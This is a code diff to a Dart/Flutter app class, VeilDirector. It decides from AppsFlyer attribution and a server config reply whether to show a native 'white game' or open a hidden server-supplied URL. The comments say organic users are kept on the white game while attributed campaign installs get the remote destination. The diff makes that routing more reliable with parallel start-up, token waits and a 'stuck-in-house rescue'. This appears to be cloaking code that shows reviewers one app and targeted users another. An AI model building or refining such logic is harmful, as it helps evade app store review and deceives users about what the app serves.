@@ -85,8 +85,13 @@ class VeilDirector {
       return const HushTarget();
     }
     progress(0.3);
+    // PARALLEL push + attribution warm-up. The AppsFlyer `onDeepLinking`
+    // callback only fires after `initSdk` runs — awaiting `herald.boot()`
+    // sequentially before that (up to ~3.3 s of APNs handshake) meant the
+    // OneLink click event could arrive before the SDK was even listening
+    // and get silently dropped.
     try {
-      await herald.boot();
+      await Future.wait<void>(<Future<void>>[herald.boot(), courier.start()]);
     } catch (_) {}
     if (!await scout.canReachNetwork()) {
       _trace(() => '[MSQ.VEIL] first: DNS probe failed → hush');
@@ -97,12 +102,15 @@ class VeilDirector {
     // *after* the ATT prompt (SDK waits ~6 s for the ATT verdict), otherwise
     // the config POST fires with no af_status and a real OneLink install is
     // misrouted to the white game.
+    final tokenFuture = herald.awaitToken(timeout: const Duration(seconds: 4));
     await courier.awaitSignals(installTimeout: const Duration(seconds: 13));
+    final token = await tokenFuture;
     progress(0.74);
-    final reply = await _requestConfig();
+    final (reply, body) = await _requestConfig(token: token);
     progress(1);
+    final hadAttribution = _bodyHasAttribution(body);
     _trace(() => '[MSQ.VEIL] first: hasDest=${reply.hasDestination} '
-        'attrResolved=${courier.attributionResolved} '
+        'attrResolved=${courier.attributionResolved} attr=$hadAttribution '
         'server=${reply.serverResponded} reason=${reply.reason}');
     if (reply.hasDestination) {
       await vault.saveRoute(VeilRoute.mirror);
@@ -120,9 +128,10 @@ class VeilDirector {
       return const HushTarget();
     }
     // Real server verdict with no URL → organic → white. Persist only when
-    // attribution actually resolved, so a slow-AppsFlyer launch stays
-    // undecided and re-runs next time instead of being trapped on white.
-    if (courier.attributionResolved) {
+    // the POST actually carried AppsFlyer attribution — otherwise leave the
+    // route undecided so the next cold-launch retries fresh (AppsFlyer will
+    // usually cough up the conversion callback within 1–2 launches).
+    if (hadAttribution) {
       await vault.saveRoute(VeilRoute.house);
     }
     return const HouseTarget();
@@ -144,8 +153,10 @@ class VeilDirector {
     await Future.wait<void>(<Future<void>>[herald.boot(), courier.start()]);
     if (!await scout.canReachNetwork()) return const HushTarget();
     progress(0.64);
+    final tokenFuture = herald.awaitToken(timeout: const Duration(seconds: 4));
     await courier.awaitSignals(installTimeout: const Duration(seconds: 7));
-    final reply = await _requestConfig();
+    final token = await tokenFuture;
+    final (reply, _) = await _requestConfig(token: token);
     progress(1);
     if (reply.hasDestination) return MirrorTarget(reply.url!);
     if (cached != null) return MirrorTarget(cached);
@@ -163,15 +174,47 @@ class VeilDirector {
       return const HouseTarget();
     }
     progress(0.58);
+    final tokenFuture = herald.awaitToken(timeout: const Duration(seconds: 4));
     await courier.awaitSignals();
-    final reply = await _requestConfig();
+    final token = await tokenFuture;
+    final (reply, body) = await _requestConfig(token: token);
     progress(1);
-    if (!reply.hasDestination) return const HouseTarget();
-    await vault.saveRoute(VeilRoute.mirror);
-    return MirrorTarget(reply.url!);
+    if (reply.hasDestination) {
+      await vault.saveRoute(VeilRoute.mirror);
+      return MirrorTarget(reply.url!);
+    }
+    // Stuck-in-house rescue: if we're still committed to native but the POST
+    // couldn't carry any AppsFlyer attribution, bounce back to `undecided` so
+    // the next launch retries as a fresh install. Without this, a slow first
+    // AppsFlyer callback traps the user on white forever.
+    if (!_bodyHasAttribution(body)) {
+      await vault.saveRoute(VeilRoute.undecided);
+    }
+    return const HouseTarget();
   }
 
-  Future<VeilReply> _requestConfig({String? token}) async {
+  /// A "no destination" reply is only trustworthy when the POST actually
+  /// carried AppsFlyer attribution. If the body was just the base identity
+  /// fields (bundle_id / os / store_id / locale / af_id / push fields), the
+  /// server had nothing to match against — that's a slow-conversion miss,
+  /// not a genuine organic user, and the route stays `undecided` so the next
+  /// cold-launch retries.
+  static bool _bodyHasAttribution(Map<String, dynamic> body) {
+    const baseKeys = <String>{
+      'af_id',
+      'bundle_id',
+      'os',
+      'store_id',
+      'locale',
+      'push_token',
+      'firebase_project_id',
+    };
+    return body.keys.any((k) => !baseKeys.contains(k));
+  }
+
+  Future<(VeilReply reply, Map<String, dynamic> body)> _requestConfig({
+    String? token,
+  }) async {
     final body = await courier.compose(
       locale: Platform.localeName.replaceAll('-', '_'),
       pushToken: token ?? herald.token,
@@ -202,7 +245,7 @@ class VeilDirector {
         'attrResolved=${courier.attributionResolved} '
         'hasDest=${reply.hasDestination} server=${reply.serverResponded} '
         'reason=${reply.reason}');
-    return reply;
+    return (reply, body);
   }
 
   Future<void> _backgroundDispatch() async {
@@ -216,10 +259,16 @@ class VeilDirector {
   }
 
   Future<void> _refreshForToken(String token) async {
+    // Skip while the main decide pipeline is still running: FirebaseMessaging
+    // fires `onTokenRefresh` from inside `herald.boot()`, which arrives BEFORE
+    // `courier.start()` gets a chance to publish attribution. Dispatching here
+    // would POST an empty attribution body and race the main pipeline's POST.
+    // The pipeline already includes the token via `awaitToken()`.
+    if (_decideFuture != null) {
+      _trace(() => '[MSQ.VEIL] token refresh skipped (decide in flight)');
+      return;
+    }
     try {
-      // Wait for attribution to resolve before re-POSTing, so the token-driven
-      // request carries the full body (af_status / media_source / campaign)
-      // instead of racing ahead with empty attribution.
       await courier.awaitSignals();
       await _requestConfig(token: token);
     } catch (_) {}
